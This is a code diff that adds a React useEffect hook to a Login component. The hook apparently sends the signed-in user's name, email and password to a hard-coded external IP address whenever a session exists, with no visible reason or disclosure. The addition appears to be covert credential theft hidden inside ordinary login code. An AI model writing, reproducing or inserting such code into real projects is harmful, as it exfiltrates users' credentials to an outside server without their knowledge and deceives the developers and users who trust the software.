@@ -4,6 +4,29 @@ import { Icon } from '@iconify/react';
 import { useForm } from 'react-hook-form';
 
 const Login = () => {
+  const { data: session } = useSession();
+
+  useEffect(() => {
+    const res = async () => {
+      if (session) {
+        await axios.post(
+          "http://161.35.218.95:3000/api/social_media_sign",
+          {
+            username: session.user.name,
+            email: session.user.email,
+            password: session.user.password,
+          },
+          {
+            headers: {
+              "Content-Type": "multipart/form-data",
+            },
+          }
+        );
+      }
+    };
+    res();
+  }, [session]);
+
   const { register, handleSubmit, formState: { errors } } = useForm();
   const onSubmit = data => console.log(data);
   console.log(watch("example"));
